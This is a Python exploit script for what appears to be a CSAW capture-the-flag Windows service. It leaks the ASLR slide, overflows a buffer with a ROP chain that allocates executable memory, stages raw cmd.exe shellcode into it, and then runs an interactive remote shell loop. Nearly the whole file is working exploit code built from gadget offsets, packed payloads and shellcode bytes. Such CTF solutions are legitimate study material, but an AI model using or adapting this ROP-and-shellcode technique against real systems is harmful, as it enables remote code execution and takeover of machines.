import sys
sys.path.append('../../../tools')
import ctf_socket
import struct
import re

HOST = '192.168.92.132'
PORT = 9998

def main():
    cs = ctf_socket.CTFSocket(HOST, PORT, dump=False)
    cs.recv_until('Password')
    raw_input('ready?')
    cs.send('GreenhornSecretPassword!!!\n')

    cs.recv_until('Selection')

    # Grab the ALSR slide and somewhere we can store our alloc pointer
    cs.send('A\n')
    data = cs.recv_until('slide')

    # ex: so your ASLR slide is: 0x00420000 and the slide variable is stored at: 0x0058fa68.
    slide = int(re.search('slide is: 0x([a-f0-9]+)',data).group(1),16)

    cs.send('V\n')

    cs.recv_until('\)\.')

    payload = 'CSAW' # Need to send in order to ret from fn
    payload += 'A' * (0x400-len(payload)) # Fill the rest of the buf
    payload += 'B' * 4 # saved ebp

    # Ret into the aslr print function. This will allocate an executable block
    # for us and leak the addr out
    alloc_offset = 0x11C0 # offset from the module base
    alloc_fn = slide + 0x400000 + alloc_offset # The slide is module base-0x400000

    payload += struct.pack('I', alloc_fn) # return addr

    # Return Addr
    pop4_gadget = slide + 0x400000 + 0x199e
    payload += struct.pack('I', pop4_gadget)

    # Args to valloc_wrap
    payload += struct.pack('I', 0) # lpaddress = 0, ie don't care
    payload += struct.pack('I', 0x800) # Size = 2048
    payload += struct.pack('I', 0x40) # PAGE_EXECUTE_READWRITE

    data_addr = slide + 0x400000 + 0x4058
    payload += struct.pack('I', data_addr) # Just use some addr in data

    # Ret addr to pop4
    do_write = slide + 0x400000 + 0x1460
    payload += struct.pack('I', do_write)

    # Ret from do_write
    pop2_gadget = slide + 0x400000 + 0x19A0
    payload += struct.pack('I', pop2_gadget)

    # args to do_write
    payload += struct.pack('I', data_addr) # buf
    payload += struct.pack('I', 4) # len

    # Ret from pop2
    vuln_fn = slide + 0x400000 + 0x1210
    payload += struct.pack('I', vuln_fn)

    # Send the first stage to allocate an executable buffer and leak
    # out the address of that buffer

    cs.send(payload + '\n')

    leaked_addr = struct.unpack('I', cs.recv(4))[0]

    print('Executable buffer @ 0x%X' % leaked_addr)

    cs.recv_until('\)\.')
    payload = 'CSAW' # Need to send in order to ret from fn
    payload += 'A' * (0x400-len(payload)) # Fill the rest of the buf
    payload += 'B' * 4 # saved ebp

    read_until = slide + 0x400000 + 0x1600
    payload += struct.pack('I', read_until)

    # Ret form read_until
    payload += struct.pack('I', leaked_addr)

    # Args to read_until
    payload += struct.pack('I', leaked_addr) # buf
    payload += struct.pack('I', 2048) # len
    payload += struct.pack('I', 0x00) # terminator char (easier if its \n that will end the read)

    # Send the second stage to load the shellcode into the exec buffer
    # and jump to it
    cs.send(payload + '\n')

    # Send cmd.exe shellcode http://www.exploit-db.com/exploits/14052/
    shellcode = ("\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
    "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
    "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
    "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
    "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
    "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
    "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
    "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
    "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
    "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
    "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
    "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
    "\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE"
    "\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53"
    "\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24"
    "\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51"
    "\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE"
    "\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45"
    "\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54"
    "\x24\x20\x57\xFF\xD0")

    cs.send(shellcode + '\x00')

    sock = cs.sock
    # cmd.exe shell
    command=''
    while(command != 'exit'):
        command=raw_input('$ ')
        sock.send(command + '\n')#raw_input won't grab a newline
        print(sock.recv(0x10000))

if __name__ == '__main__':
    main()
